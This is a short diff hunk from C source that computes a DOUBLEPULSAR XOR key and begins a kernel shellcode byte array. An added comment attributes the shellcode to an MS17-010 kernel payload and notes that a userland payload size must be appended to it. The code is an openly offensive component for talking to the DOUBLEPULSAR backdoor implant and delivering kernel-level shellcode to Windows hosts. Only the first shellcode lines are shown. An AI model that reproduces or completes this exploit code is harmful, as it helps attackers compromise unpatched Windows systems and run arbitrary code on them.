@@ -175,6 +175,13 @@ int main(int argc, char* argv[])
 	unsigned int XorKey = ComputeDOUBLEPULSARXorKey(sig);
 	printf("Calculated XOR KEY:  0x%x\n", XorKey);
 
+	/*
+	https://github.com/RiskSense-Ops/MS17-010/blob/master/payloads/x64/src/exploit/kernel.asm  
+	Name: kernel  
+	Length: 1019 bytes
+	
+	Requires a userland payload size length to be added at the end 
+	*/
 	unsigned char kernel_shellcode[] =
 		"\xB9\x82\x00\x00\xC0\x0F\x32\x48\xBB\xF8\x0F\xD0\xFF\xFF\xFF\xFF"
 		"\xFF\x89\x53\x04\x89\x03\x48\x8D\x05\x0A\x00\x00\x00\x48\x89\xC2"
